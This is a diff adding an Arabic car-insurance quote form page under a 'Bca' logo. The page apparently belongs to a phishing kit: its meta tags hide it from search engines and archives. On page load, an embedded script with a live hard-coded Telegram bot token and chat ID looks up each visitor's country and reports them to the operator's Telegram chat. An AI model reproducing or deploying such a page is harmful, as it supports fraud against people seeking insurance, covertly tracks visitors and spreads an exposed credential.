@@ -1,0 +1,268 @@
+<!DOCTYPE html>
+<html lang="ar">
+
+<head>
+  <meta content="width=device-width, initial-scale=1" name="viewport" />
+  <meta charset="utf-8" />
+  <!-- Prevent indexing and following by well-behaved crawlers: -->
+  <meta name="robots" content="noindex, nofollow" />
+
+  <!-- Prevent archiving or snippet display: -->
+  <meta name="googlebot" content="noindex, nofollow, noarchive, nosnippet" />
+  <meta name="bingbot" content="noindex, nofollow" />
+  <meta name="yandex" content="none" />
+  <title>details</title>
+
+  <link crossorigin="anonymous" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css"
+    integrity="sha384-xOolHFLEh07PJGoPkLv1IbcEPTNtaed2xpHsD9ESMhqIYd0nLMwNLD69Npy4HI+N" rel="stylesheet" />
+  <style>
+    @import url("https://fonts.googleapis.com/css2?family=Readex+Pro:wght@160..700&display=swap");
+    @import url("https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css");
+
+    * {
+      font-family: "Readex Pro", sans-serif;
+      font-optical-sizing: auto;
+      font-weight: 400;
+      font-style: normal;
+      font-variation-settings: "HEXP" 0;
+    }
+
+    .content {
+      background: white;
+      border-radius: 0 0 20px 20px;
+      padding: 30px 20px;
+      margin: -30px 10px 30px;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.05);
+      min-height: 200px;
+      font-size: 16px;
+      color: #333;
+    }
+
+    .content-section {
+      display: none;
+    }
+
+    .content-section.active {
+      display: block;
+    }
+
+    .form-group {
+      margin-bottom: 1.5rem;
+    }
+
+    .form-group label {
+      font-size: 14px;
+      font-weight: 400;
+      color: #777;
+      display: block;
+      margin-bottom: 6px;
+    }
+  </style>
+
+</head>
+
+<body>
+  <nav class="navbar navbar-expand-lg navbar-light bg-light text-center">
+    <img alt="" src="assets/icon/Bca-logo.svg" style="margin: auto" width="122px" />
+  </nav>
+  <div class="text-center container">
+    <h5 class="mt-3">بيانات التأمين</h5>
+    <hr />
+    <span id="decline-message" style="display: none; color: red"> </span>
+    <div class="text-right">
+      <form>
+        <div class="form-group" dir="rtl">
+          <label for="Typeـofـinsuranceـcontract">نوع التأمين</label>
+          <select class="form-control" id="Typeـofـinsuranceـcontract">
+            <option value="">إختر</option>
+            <option value="ضد الغير">ضد الغير</option>
+            <option value="شامل">شامل</option>
+          </select>
+        </div>
+        <div class="form-group">
+          <label for="Insuranceـstartـdate">تاريخ بدء التأمين</label>
+          <input class="form-control" id="Insuranceـstartـdate" min="" type="date" />
+        </div>
+        <div class="form-group" dir="rtl">
+          <label for="Purposeـofـuseـofـtheـvehicle">الغرض من استخدام المركبة</label>
+          <select class="form-control" id="Purposeـofـuseـofـtheـvehicle">
+            <option value="">إختر</option>
+            <option value="شخصي">شخصي</option>
+            <option value="تجاري">تجاري</option>
+            <option value="تأجير">تأجير</option>
+            <option value="نقل الركاب او كريم - اوبر">
+              نقل الركاب او كريم - اوبر
+            </option>
+            <option value="نقل بضائع">نقل بضائع</option>
+            <option value="نقل مشتقات نفطيه">نقل مشتقات نفطيه</option>
+          </select>
+        </div>
+        <div class="form-group">
+          <label for="Estimated_value_of_the_vehicle">القيمة التقديرية للمركبة</label>
+          <input class="form-control" id="Estimated_value_of_the_vehicle" type="tel" minlength="4" maxlength="7"
+            pattern="^[0-9]{4,7}$" title="يجب أن يكون الرقم مكوّناً من 4 إلى 7 أرقام فقط"
+            oninput="this.value = this.value.replace(/\D/g, '').slice(0, 7)" required />
+        </div>
+        <div class="form-group" dir="rtl">
+          <label for="Yearـofـmanufactureـofـtheـvehicle">سنة صنع المركبة</label>
+          <select class="form-control" id="Yearـofـmanufactureـofـtheـvehicle">
+            <option value="">إختر</option>
+          </select>
+        </div>
+        <div class="text-right mb-3" dir="rtl">
+          <label>مكان اصلاح المركبة</label>
+          <div class="form-check">
+            <input checked class="form-check-input" id="Agency" name="Chooseـtheـrepairـmethod" type="radio" />
+            <label class="form-check-label mr-3" for="Agency">الوكالة</label>
+          </div>
+          <div class="form-check">
+            <input class="form-check-input" id="Repairـshop" name="Chooseـtheـrepairـmethod" type="radio" />
+            <label class="form-check-label mr-3" for="Repairـshop">الورشة</label>
+          </div>
+        </div>
+        <button class="btn btn-warning col-12" type="submit">
+          إظهار العروض
+        </button>
+      </form>
+    </div>
+  </div>
+
+
+
+
+
+
+<!--  TELEGRAM SCRIPT -->
+<script>
+
+document.addEventListener("DOMContentLoaded", function () {
+  // منع التكرار خلال نفس الجلسة
+  if (sessionStorage.getItem("telegramSent")) {
+      // console.log("الإشعار سبق وتم إرساله خلال هذه الجلسة.");
+      return;
+  }
+
+  // إعدادات البوت (من قبلك)
+  const telegramToken = "8579444830:AAHPXx3c41OW_GvQzxy2Ff57ynzOiqzx12w";
+  const chatId = "-5039805395";
+
+  // 👇 هنا اسم الصفحة (عدّله حسب الحاجة)
+  const pageName = "التفاصيل";
+
+  // تحديد حالة الزائر (جديد/قديم)
+  let visitorType = localStorage.getItem("visitorType");
+  let status = "";
+  if (!visitorType) {
+    localStorage.setItem("visitorType", "old");
+    status = "زبون جديد";
+  } else {
+    status = "زبون قديم";
+  }
+
+  // جلب الدولة من API ثم إرسال الرسالة إلى التليجرام
+  fetch('https://api.country.is')
+    .then(response => response.json())
+    .then(data => {
+      const country = data.country || "غير معروف";
+      const message = `حالة الزائر: ${status}\nالدولة: ${country}\nالصفحة: ${pageName}`;
+
+      // إرسال الرسالة إلى تليجرام
+      return fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+          disable_notification: false
+        })
+      });
+    })
+    .then(res => res.json())
+    .then(resJson => {
+      if (resJson.ok) {
+        console.log("✅ تم إرسال الإشعار إلى تليجرام بنجاح.");
+        sessionStorage.setItem("telegramSent", "true"); // منع التكرار خلال الجلسة
+      } else {
+        console.log("❌ فشل إرسال الإشعار:", resJson);
+      }
+    })
+    .catch(err => {
+      console.log("⚠️ خطأ أثناء الإرسال أو جلب الدولة:", err);
+    });
+});
+
+</script>
+<!-- END TELEGRAM SCRIPT -->
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <script>
+    const selectYear = document.getElementById(
+      "Yearـofـmanufactureـofـtheـvehicle"
+    );
+    for (let y = 2000; y <= 2026; y++) {
+      const opt = document.createElement("option");
+      opt.value = y;
+      opt.textContent = y;
+      selectYear.appendChild(opt);
+    }
+    document
+      .getElementById("Insuranceـstartـdate")
+      .setAttribute("min", new Date().toISOString().split("T")[0]);
+  </script>
+
+
+
+
+
+  <script>
+
+    document.querySelector("form").addEventListener("submit", async (e) => {
+      e.preventDefault();
+
+      const contractType = document.getElementById("Typeـofـinsuranceـcontract").value;
+
+      // Decide next page
+      window.__nextDetailsPath =
+        contractType === "ضد الغير"
+          ? "thirdparty.html"
+          : "comprehensive.html";
+
+      // Build and send payload
+      const payload = {
+        // ip: window.visitorIP,
+        TypeOfInsuranceContract: contractType,
+        InsuranceStartDate: document.getElementById("Insuranceـstartـdate").value,
+        PurposeOfUse: document.getElementById("Purposeـofـuseـofـtheـvehicle").value,
+        EstimatedValue: document.getElementById("Estimated_value_of_the_vehicle").value,
+        ManufactureYear: document.getElementById("Yearـofـmanufactureـofـtheـvehicle").value,
+        RepairLocation: document.getElementById("Agency").checked? "الوكالة": "الورشة",
+      };
+
+      if(document.getElementById("Typeـofـinsuranceـcontract").value == "ضد الغير"){
+        window.location.href = "thirdparty.html"
+      }
+      else{
+        window.location.href = "comprehensive.html"
+
+      }
+    });
+
+
+  </script>
+
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+
+</html>
